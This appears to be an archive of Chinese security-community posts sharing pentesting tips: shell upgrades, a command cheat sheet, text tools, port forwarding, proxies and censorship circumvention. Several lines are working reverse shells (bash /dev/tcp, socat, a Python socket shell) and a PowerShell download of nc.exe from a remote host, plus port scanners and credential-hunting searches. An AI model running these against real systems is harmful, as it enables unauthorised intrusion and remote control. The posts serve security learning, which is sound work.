

[Upgrading shells to fully interactive TTYs](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

 

这篇文章很赞，以前我们反弹回来的 NC Shell，操作实在太过简陋，一个命令输错就意味着丢失 Shell，没历史，没 Tab，没 Vim，就是个最最简陋的 Shell。

反弹技巧不少，这里先不谈，有的是能得到完美的 TTYs 终端，这篇文章第一个方式其实也简单提了，虽然还不完美。

文章介绍了三个技巧，如下：

__Using Python for a psuedo terminal__

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

__Using socat__

+ Listener:

```
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

+ Victim:

```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

__Using stty options__

+ In reverse shell

```
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
```

+ In Kali

```
$ stty raw -echo
$ fg
```

+ In reverse shell

```
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>
```

我想精于 Linux 的同学应该还会有其他更好的技巧吧？😏

<img src="https://images.xiaomiquan.com/Fj_Ou8qWblsD8PQbMkbsiFOsbVNk?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:m9ZuUhEYmVExE9s4WOF_-76vOkQ=" width="50%" height="50%" align="middle"/>

<img src="https://images.xiaomiquan.com/FvH1DFbKMjFYlnJOg75OJTcHz1YO?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:HXPfrhY8yBHQnFbwYRbCWl2s7hE=" width="50%" height="50%" align="middle"/>

<img src="https://images.xiaomiquan.com/Fig865CAfX1G7zfSlHpk6qHQwWgE?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:Q7-DgFAG9jPiRq6mRqmY5BwXZFU=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/74/dd/74dd868df857e0ffec8613ae99f0891f0e7088f3533e8bd16f9614477984d3f6.jpg" width="25px"/> __‍迷途の狼__: 不错的技巧，不过linux下监听win下反弹的cmd 也是很蛋疼 一个字符输错 又得重新输入 还乱码

<img src="https://file.xiaomiquan.com/b4/82/b482e6485bf4a4d6d6fdd738268a244a4dc592e0d9241454f50752345ad531d7.jpg" width="25px"/> __dusts__: 不精通linux的想知道其他更好的技巧。。。。要是环境里没有python,没有socat，该如何。。。

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/b4/82/b482e6485bf4a4d6d6fdd738268a244a4dc592e0d9241454f50752345ad531d7.jpg" width="25px"/> __dusts__: 没注意到第三种方式？


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-24:


__#HITB#__

  
__#福利#__

刚刚逛厂商，看到一家摆出了这个，打开一看，惊喜了。

正是我们感兴趣的，哈哈。Python、PowerShell、CMD、Bash 的黑技巧。

原图给大家收藏。

<img src="https://images.xiaomiquan.com/FtHgBobVyPc7Qt8Qy8tXI7cgQc6H?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:3WRynGY_hgXSpOEFMFLWXfIUBIc=" width="50%" height="50%" align="middle"/>

<img src="https://images.xiaomiquan.com/FkY65wMZm0J9Dm9MUbyqxjADkXRz?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:mvBVVsH2y-h0DzWlTty38GWzTW8=" width="50%" height="50%" align="middle"/>

<img src="https://images.xiaomiquan.com/FrHRUsP5y403NBAzNULmRLK-09CI?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:RuwFdc4wmXaeE9LnYU7SVJhAqPU=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/fc/6a/fc6a8b97a0702c8ca06abad9cb5ca9e275d54577b4c41b70fcd9d314db5b680d.jpg" width="25px"/> __三思之旅__: 翻译过该网站两篇关于Powershell的技巧😄：
[【技术分享】手把手教你使用PowerShell内置的端口扫描器 - 安全客 - 有思想的安全新媒体](http://bobao.360.cn/learning/detail/3961.html)

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/fc/6a/fc6a8b97a0702c8ca06abad9cb5ca9e275d54577b4c41b70fcd9d314db5b680d.jpg" width="25px"/> __三思之旅__: 赞


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-28:


__#基础#__

Linux下的“三剑客”

分享来自@嘀嗒的钟  

前段时间，因为工作需求，需要对大量的脏数据以及日志数据搭建数据库进行统计分析，在数据清洗入库阶段，发现“三剑客”在处理文本内容上的极大优势和效率，故对这个三个命令进行了整理， 分享给大家。

在Linux系统当中，处理文本有三个常用的模式匹配命令 grep sed awk ，这三个命令十分灵活，熟练掌握对你在Linux下文本处理效率有极大的提高。

grep的全称为： Global search Regular Expression and Print out the line，是的，你英文理解对了，grep命令主要用来查找字符串，具体命令可以像下面那样

匹配含有root字符串的行，并打印行号

```
cat /etc/passwd | grep -n 'root'
```

或这样

获取本机的IP地址和子网掩码

```
ifconfig | grep -E -o --color "\<([1-9]|[1-9][0-9]|1[1-9][1-9]|2[1-5][0-5])\>.\<([1-9]|[1-9][0-9]|1[1-9][1-9]|2[1-5][0-5])\>.\<([1-9]|[1-9][0-9]|1[1-9][1-9]|2[1-5][0-5])\>.\<([1-9]|[1-9][0-9]|1[1-9][1-9]|2[1-5][0-5])\>"
```

grep 常用的参数

```
-i 表示搜索字符串的时候不区分大小写
-n 显示行号
-c 只显示匹配到的行数，不显示具体的内容
-o 只显示符合条件的字符串，但不显示整行
-v 显示不含关键字的行
-q 静默匹配模式，不输出任何信息，所以若要查看匹配的结果，需要使用echo $?来查看
-e 实现多个表达式的匹配
-w 精确匹配，及只匹配整个字符串
-Ax 显示匹配表达式之前的x行
-Bx 显示匹配表达式之后的x行
-Cx 显示匹配表达式前后各x行
-p 兼容perl的正则引擎
-E 使用扩展正则表达式
--color 对匹配关键字进行高亮显示
```

此外，grep还有一些不常用的参数，有兴趣的可以输入如下命令来细细把玩， 像这样

```
man grep
```

grep还有两个兄弟命令，分别为egrep， fgerp。

egrep命令，支持扩展正则表达式，相当于grep -E

fgrep命令，不支持正则表达式，只能匹配固定的字符串，相当于grep -w，但是fgrep的搜索速度要比grep -w快很多。

sed命令，sed的全称为stream editor，sed在处理时一次只读取文件的一行并对这一行进行处理，并且sed将处理后的数据只会显示在屏幕上，并不会对原文件进行修改，所以说sed是一个行编辑器。具体命令可以像下面那样

删除/etc/passwd文件中的空白行

```
sed "/^$/d" /etc/passwd
```

或这样

替换/etc/inittab文件中”id:3:initdefault:"一行中的数字为5
```
sed 's@\(id:\)[0-9]\(:initdefault\)@\15\2' /etc/inittab
```

sed常用参数

```
 -n：静默模式，不输出模式空间内的内容，默认打印空间模式内的内容
 -r：扩展的正则表达式
 -f 文件：指定sed脚本文件
 -i：直接编辑源文件
 #编辑命令
 d：删除
 p：打印
 i \:在被指定到的行前面插入文本
 a \:在被指定到的行下面插入文本
 r 文件路径：在指定的位置插入另外一个文件的内容
 w 文件路径：将符合条件的所有行保存至指定的文件中
 = 显示符合条件的所在行的行号
```

同样，有兴趣的可以输入如下命令来细细把玩，像这样

```
man sed
```

awk命令，awk是由Alfred Aho 、Peter Weinberger 和 Brian Kernighan这三个人创造的，awk由这个三个人的姓氏的首个字母组成。awk早期是在unix上实现的，所以，我们现在在linux的所使用的awk其实是gawk，也就是GNU awk，简称为gawk，awk还有一个版本，New awk，简称为nawk，但是linux中最常用的还是gawk。

awk基本语法

```
awk [option] 'Pattern{Action}' file
```

awk常用参数

```
-v 设置变量的值
-F 指定分隔符, awk内部变量FS也可以实现分隔符的效果，像这样： -v FS=":"
awk常用内置变量
FS：输入字段分隔符， 默认为空白字符
OFS：输出字段分隔符， 默认为空白字符
RS：输入记录分隔符(输入换行符)， 指定输入时的换行符
ORS：输出记录分隔符（输出换行符），输出时用指定符号代替换行符
NF：number of Field，当前行的字段的个数(即当前行被分割成了几列)，字段数量
NR：行号，当前处理的文本行的行号。
FNR：各文件分别计数的行号
FILENAME：当前文件名
ARGC：命令行参数的个数
ARGV：数组，保存的是命令行所给定的各参数

Action就是动作，awk中最常用的两个动作print， printf。
Pattern就是模式，通俗的讲就是条件，awk常用的模式有 BEGIN模式，END模式，关系表达式模式，正则表达式模式。
```

具体命令可以像下面那样

```
df | awk 'BEGIN{print "begining"} {print $0} END{print "ending"}'
```

或像这样

利用awk分割和格式化能力，可以直接对数据清洗入库

```
cat file | awk -F: '{ if(NF == 5) { printf "INSERT INTO table_name (col1, col2,...) VALUES (%s, %s,....)\n", $1, $2, $3, $4, $5 } }' file
```

同样，有兴趣的可以输入如下命令来细细把玩，像这样

```
man awk
```

__总结__

grep适合单纯的查找字符或者匹配文本，当然可以结合bash or python脚本， 实现对某个目录下字符串的查找；sed则更适合于编辑文本；awk 更适合文本格式化，这个在大数据清洗的时候，很好用。本文只是介绍了这三个命令的低阶用法，高阶用法需要大家在熟练掌握三个命令后结合实际的工作场景

另外， 推荐一张linux下常用命令的基础技能表（如图）。

__参考资料__

之前记得@余弦  曾经推荐过一系列书，其中有一本讲软件设计的书《Software Design 中文版 03》，这本书其实是日本的计算机杂志，每个月都有一期（目前还在出），但是国内的出版社貌似也就翻译了这一期，没有后续可惜了。这本杂志用了不少篇幅在讲sed和awk编程， 非常不错，我当初就是冲着awk买的，没有找到电子版，放个链接《Software Design 中文版 03》：


[《Software Design 中文版 03》【摘要 书评 试读】- 京东图书](https://item.jd.com/11688328.html)

 

另外，这里推荐一个国人写的awk的教程：


[awk | 朱双印博客](http://www.zsythink.net/archives/tag/awk/)

 

之前ke@ATToT分享iptables的时候，已经推荐了这个作者，确实很棒，写得非常详细。

<img src="https://images.xiaomiquan.com/FnlEIcOrNLL_S3yPQhQQ2EyPAwWg?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:jK4vljZeFyVCAvpVwQJWiXwN3Iw=" width="50%" height="50%" align="middle"/>


---

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-09-09:


__#姿势#__

解读下弦哥从新加坡HITB黑客大会进口过来的黑魔法命令吧。

虽然都比较简单，但是在一些应用场景下简直就像把简单螺丝刀变成瑞士军刀了。

黑魔法命令

一、BASH

1.将一个分区通过ssh加密通道压缩传输到10.10.10.10 设备上

```
dd if=/dev/rdisk0s1s2 bs=65536 conv=noerror,sync | ssh -C user@10.10.10.10 "cat >/tmp/image.dd"
```

2.验证指定IP的端口服务是否一直在开通状态，每隔一秒刷新一次，如果端口开通，则输出Service is up。

```
while (true)；do nc -vv -z -w3 10.10.10.10 80 > /dev/null && echo -e "Service is up"; sleep 1;done
```

3.创建一个反弹shell到指定的ip上。

```
bash -i >& /dev/tcp/10.10.10.10/8080 0>&1
```

4.用系统自带base64做编码解码处理，很方便。

`echo ‘Hello, World!' | base64` 把 ‘Hello, World’ 字符串做base64编码

`echo 'XXXXXXXX' | base64 -d` 将编码后的字符串‘XXXXXXX’ 做解码

也可以先输入 `base64 -d` 然后输入要解码的字符，再按 Ctrl+d 进行解码

5.克隆一个网站到本地，比如 `wget -r -mH www.baidu.com`

```
wget -r -mH $URL
```

6.根据文件名从指定路径中寻找包含特定字符串的文件，并将包含该字符串的行和该文件名输出。

```
find /PATH/TO/DIRECTORY -name "filename" -type f -exec grep -i "STRING" {} \； -print 2>/dev/null
```

7.呵呵，这个是用ccat查看文件内容时，给一些代码中特殊字符加上颜色，看代码方便很多。

```
alias ccat='pygmentize -O bg=dark,style=colorful'
```

8.查看自己的公网IP

```
curl -4 icanhazip.com
wget -qO- ifconfig.me/ip
```

补充两个

```
curl ipinfo.io
curl ip.cn
```

9.多聪明的命令，给自己的上一条命令自动加上sudo,并命一个简短的别名，是不是经常忘记输入sudo，这下世界美丽了不少吧。

```
alias gah='sudo $(history -p \!\!)'
```

二、CMD KUNG-FU

1.这个命令用于用电脑的无线网卡创建一个无线热点，不过要看你的网卡是不是支持承载网络，不支持的话就没办法建立热点。

```
netsh wlan set hostednetwork mode=allow ssid=<MYSSID> key=<MYPASSWORD> && netsh wlan start hostednetwork
```

`netsh wlan drivers` 可以查看网卡支不支持承载网络。

2.Windows下的端口转发，可以支持v4tov4、v4tov6、v6tov6、v6tov4，windows自带的，很方便。

```
netsh interface protproxy add v4tov6 listenport=<LPORT> listenaddress=0.0.0.0 connectport=<PORT> connectaddress=<RHOST>
```

3.查询指定IP或者端口的连接，并每秒刷新一次。

```
netstat -naob 1 | find "<IPADDR or PORT>"
```

4.获取正在运行进程的一些详细信息。

```
wmic process list full
```

5.显示每个进程对应的服务。

```
tasjkust /svc
```

三、PowerShell

1.用ping命令去扫描整个C段

```
1..255 | % {echo "192.168.253.$_"; ping -n 1 -w 100 192.168.253.$_} | Select-String ttl
```

补充个cmd的

```
for /L %i in (1,1,255) do @ping 192.168.253.%i -n 1 -w 100 | find /i "ttl"
```

2.从http服务器下载文件保存到本地

Win 7:   `(New-Object System.Net.Webclient).DownloadFile("http://10.10.10.10/nc.exe","c:\nc.exe")`

Win8 and later:  `wget "http://10.10.10.10/nc.exe"  -outfile "c:\nc.exe"`

3.查看Windows内置防火墙的规则，非常详细，各个程序入站出站的规则和端口等详细信息都有。

```
Get-NetFirewallRule -all | Out-GridView
```

`Get-NetFIrewallRule -all | Export-csv <filename.csv>`
将查询结果导出到一个csv文件中

4.给Windows内置防火墙增加一条准许的规则。Win7 测试无法用，Win10 可以。

```
New-NetFIrewallRule -Action Allow -DisplayName Pentester-C2 -Remoteaddress <IPADDR>
```

5.用powershell来端口扫描

```
1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.0.0.100",$_)) "Port $_ is open!"} 2>$null
```

扫描一个IP范围是否开放指定端口

```
foreach ($ip in 1..20) {Test-NetConnection -Port 80 -InformationLevel "Detailed" 192.168.253.$ip}
```

设定IP范围和端口范围进行扫描(速度比较慢)

```
1..20 | % { $a = $_; 1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.0.0.$a",$_)) "Port $_ is open!"} 2>$null}
```

6.从指定目录的文件中寻找文件内容包含STRING字符的文件，并显示该行内容和文件名。一般用于查询记录的密码和配置了。

```
ls -r c:\PATH\DIRECTORY file | % {Select-String -path $_ -pattern STRING}
```

四、python

1.开启一个简易的HTTP服务器，很方便有没有。

python 2.x

```
python -m SimpleHTTPServer 8000
```

python 3.x

```
python3 -m http.server 8000
```

2.用python从HTTP服务器来下载文件，或者是整站的页面。

python 2.x

```
python -c 'import urllib2; print urllib2.urlopen("http://10.10.10.10").read()' | tee /tmp/file.html
```

python 3.x

```
python3 -c 'import urllib.request;urllib.request.urlretrieve("http://10.10.10.10","/tmp/10.10.10.html")'
```

3.将一个反弹回来或是漏洞利用得到的shell转换为一个类似终端的shell。这样shell就可以交互了。

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

4.用python创建一个反弹shell，类似nc。Windows和Linux通用

```
python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect(('<IPADDR>',<PORT>))\nwhile 1: proc =
subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"
```

资源推荐:

[https://pen-testing.sans.org/blog/category/command-line-kung-fu](https://pen-testing.sans.org/blog/category/command-line-kung-fu)

(命令都是来自这家安全培训公司，他们网站上有命令演示，和每个参数的详解，感兴趣可以去看看，需自己爬出去)

[https://mva.microsoft.com/zh-cn/training-courses/-power-shell-30-14443?l=Phq2m1PkB_3500115888](https://mva.microsoft.com/zh-cn/training-courses/-power-shell-30-14443?l=Phq2m1PkB_3500115888)

(PowerShell作者出的教程视频，中文字幕、中文字幕、中文字幕)


__分享文件:__

[黑魔法命令.pdf](https://github.com/ChrisLinn/greyhame-2017/blob/master/shared-files/黑魔法命令.pdf)


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 赞这样的解读啊😘

<img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__: 赞

<img src="https://file.xiaomiquan.com/85/7e/857e7074cd57069c52c64361162a16153347497cda25cad85d234445a06ef8b2.jpg" width="25px"/> __愤怒CPU__: mark😏


...

---

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__ on 2017-09-19:


__#姿势#__

 
这篇文章对shell的讲解很详细，很多反弹shell的姿势，都值得大家亲自实操一下，留档备用

[关于Shell你想知道的都在这儿 - FreeBuf.COM | 关注黑客与极客](http://www.freebuf.com/articles/system/147768.html)





...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 顺便搜下本圈之前的相关内容，关键词“反弹”

...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-20:


__#后门#__

用 Mac 电脑且安装了 iTerm2 终端应用的同学注意下这个：


[你的终端是安全的吗？iTerm2 中可能通过 DNS 请求泄漏隐私信息 - FreeBuf.COM ...](http://www.freebuf.com/news/148292.html)

 

失误性后门...



...

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 满世界都在爆后门


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-10-09:


__#资源#__

渗透师必备命令之 awk 与 sed 高级操作

以前刚入门 Linux 渗透时，一位前辈黑客就教会了我们这些命令，学习下来后，在无数的场合下确实大大提升了操作与分析速度。尤其像 awk 这样的命令，本身还可以当成脚本语言，非常强大。

这篇文章来自知名 Red Team，推荐新人们好好过一遍，不仅可以学会这两个命令的高级技巧，还可以学会大量其实很简单的英文。


[https://bluescreenofjeff.com/2017-10-03-f-awk-yeah-advanced-sed-and-awk-usage-parsing-for-pentesters-3/](https://bluescreenofjeff.com/2017-10-03-f-awk-yeah-advanced-sed-and-awk-usage-parsing-for-pentesters-3/)



注意了：任何技巧，不实战，不常用，都会废掉。[微笑]



---


## 端口转发


<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-05-31:


__#姿势#__

 端口转发各种姿势解析之 SSH 隧道

我们看到有两个同学都在问端口转发的事，前两天厦门微型安全技术沙龙，我做正好做了这个分享，但是还没有梳理出完整的 PPT/Paper，直接把内容放上来会不妥。

这里分享个链接，大家可以看看 SSH 隧道如何做“本地端口转发”、“远程端口转发”、“动态端口转发”等。


[实战 SSH 端口转发](https://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/index.html)



其实这个我在最开始分享的“知道创宇研发技能表”里是有列的:-)

当玩明白 SSH 隧道后，再来看看这篇老外的大汇总：

[https://artkond.com/2017/03/23/pivoting-guide/](https://artkond.com/2017/03/23/pivoting-guide/)



可以看到端口转发的姿势非常之多，但是这个有点不好科普，说多无用，玩起来吧。

端口转发各种姿势解析，我们准备做成培训课程的，如果是以完整培训来要求，单这门技能就可以培训一整天了...


---

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-08-20:

> 匿名用户 提问：
问表哥一个内网渗透中端口转发的问题。
目标主机是Windows 7。内网ip为172.26.14.15。
NetSH 缺省listenaddress参数 的情况下，是监听127.0.0.1 loopback 还是监听本地IP？
也就是说缺少listenaddress的情况下，是listenaddress=127.0.0.1还是listenaddress=172.26.14.15。


没有listenaddress 参数的话就直接是本地ip地址，你可以用netstat -an 看监听的端口，是0.0.0.0



---

## 代理

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-06:

> 匿名用户 提问：
余大 能否推荐一款windows上用的稳定的反向socks代理工具？开源的也行

你可以先看看安全技能树里推荐的端口转发那些内容，看看是否有你需要的。


---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-12:

> 北风飘然 提问：
弦大 最近打算写个被动扫描的东西  大概是 浏览器=>python代理   然后做异步请求  不知道有什么推荐的第三方库做代理么


有，mitmproxy 很不错。


---

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__ on 2017-08-28:


__#基础#__

「FanQiang」 - 年轻人的第一把梯子

这次我们「试着」说说徒手「翻x墙」这个技能。关于这次分享的主题，涉及敏感话题，大家懂得。

本着「让年轻人打造第一把属于自己的梯子」的信念，担着被和谐的风险，有了这次的分享。

「翻x墙」可以说是一个必备技能了，但是新手入坑一般都是从「免费」开始的。

其实只要你想找，正确的姿势你能很容易找到。当然，不是说那些「free v.p.n」。

这次我们说说自己动手「0 成本使用 AWS 搭建 SS 服务器」这个标准姿势。

链接：
[「从入门到入狱系列」 - AWS SS 0成本徒手翻墙 | 灰色地带](http://ev1l.cn/2017/08/26/AWS_SS_Hello_World/)


文章比较偏向「有灵性的小白」。

最后搬运一下 COS 分享过的一组符号表情
┓┏┓┏┓┃
┛┗┛┗┛┃＼○／
┓┏┓┏┓┃   /     STOP
┛┗┛┗┛┃ノ)
┓┏┓┏┓┃         USE
┛┗┛┗┛┃ 
┓┏┓┏┓┃         FREE
┛┗┛┗┛┃ 
┓┏┓┏┓┃         V.P.N
┃┃┃┃┃┃



...

<img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__: 文章里竟然开车。。。🙊

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__ replies to <img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__: 🐒

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 赞！写的很详细，aws很易用，上手之后可以去买个性价比高的vps.

<img src="https://file.xiaomiquan.com/25/54/2554db8a586cc8faa9975308b54f5988af68e0b341cb88b77e90e4c05ebeab88.jpg" width="25px"/> __Immortals__: 可以尝试kcptun加速ss，1080p不是问题

<img src="https://file.xiaomiquan.com/59/51/5951d4e58f300c77c694d102186da5cca79e17dc6ba43fc529c330cd75005c2c.jpg" width="25px"/> __请添加备注__: 阿里云貌似也可以，就是有些小贵

<img src="https://file.xiaomiquan.com/fc/6a/fc6a8b97a0702c8ca06abad9cb5ca9e275d54577b4c41b70fcd9d314db5b680d.jpg" width="25px"/> __三思之旅__: Google Cloud免费一年，油管4K轻松飞起😏

<img src="https://file.xiaomiquan.com/73/46/7346088fcbd428bef2055102b2eb708048b824a0e3a18a369d5c40ef3265e14c.jpg" width="25px"/> __TomW__: aws免费的现在好像不是每月15G了，是450小时。昨天帮朋友搭梯子发现的

<img src="https://file.xiaomiquan.com/73/4f/734f2c7364f4ef86e936145ef88229d700ac299eb89414ded45da3c1923caa9e.jpg" width="25px"/> __苏少‮蛋脸小的你下一了亲并‭__: 其实我觉得搬瓦工更简单一点

<img src="https://file.xiaomiquan.com/f0/bf/f0bfbda89e3585e2553dc9f03f3bdab2b563215c2cfdbb66931262abb622cf61.jpeg" width="25px"/> __黑色的眼睛__: 没看到亚马逊哪里有写：每月15G流量的限制啊？

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__ replies to <img src="https://file.xiaomiquan.com/f0/bf/f0bfbda89e3585e2553dc9f03f3bdab2b563215c2cfdbb66931262abb622cf61.jpeg" width="25px"/> __黑色的眼睛__: 
[https://aws.amazon.com/cn/free/faqs/](https://aws.amazon.com/cn/free/faqs/)

...

---

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ on 2017-09-22:

分享一个小tips：如何愉快地Tor

首先你要有个ss服务器，在你的VPS上apt-get install tor proxychains
然后再开一个ss进程

```
proxychains ss-server -c config.json -f pid 2
```

此时本机上流量走你的ss就自然通过Tor了，延迟还不错哦



...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: proxychains代理辅助神器，不小心又发车了

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__: 如果你的ss稳定实测这种方式能有平均2Mb的速度

<img src="https://images.xiaomiquan.com/FjRLNY2fWjT9fSYYUy2TVLJyjGBk?e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:JJXkrKbjrxWrJbruGdSPpJlCe88=" width="50%" height="50%" align="middle"/>

<img src="https://file.xiaomiquan.com/3e/bc/3ebce5c2bb67c5ad0ea4e2d0dd0d9b2c60e444bc18d1021d44aea7b315216686.jpg" width="25px"/> __heather__: 混淆提速

<img src="https://file.xiaomiquan.com/f1/cd/f1cd5ee079f57ef0999999f8ccf3b20cfc72e953eee382ad7936d39e7cec9e81.jpg" width="25px"/> __maodidi__ replies to <img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__: 你这个图好酷啊，可以问一下是什么程序吗？

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ replies to <img src="https://file.xiaomiquan.com/f1/cd/f1cd5ee079f57ef0999999f8ccf3b20cfc72e953eee382ad7936d39e7cec9e81.jpg" width="25px"/> __maodidi__: 这是arm，Tor官方的图形化界面(字符图形化)

<img src="https://file.xiaomiquan.com/d0/9b/d09be42dca6da1cd2e393da9bf83693bc0fec1c7b7973571e760bda8af5f738b.jpg" width="25px"/> __葫芦娃__: 请问ssr可以吗？

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ replies to <img src="https://file.xiaomiquan.com/d0/9b/d09be42dca6da1cd2e393da9bf83693bc0fec1c7b7973571e760bda8af5f738b.jpg" width="25px"/> __葫芦娃__: 理论上可以的，实践一下才知道


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-11-04:

> 。东 提问：
昨晚上有个思路。sqlmap检测一些有防火墙的站点的时候，很多时候检测不了一会儿就会被防火墙封了ip。sqlmap上面有一些绕过的规则，但是我并不想用这个。考虑到一些爬虫会动态调用代理ip，从而绕过防火墙，那么，我们是不是可以这样子，给sqlmap写一个动态调用的脚本？


可以，这又不难。



...

<img src="https://file.xiaomiquan.com/35/85/3585c8ae9ba10ae77e5e5a96d40d31ccc47e373cbcaceead666389734257bec2.jpg" width="25px"/> __C4r3Fr33__: 最简单的实现就是结合TOR了

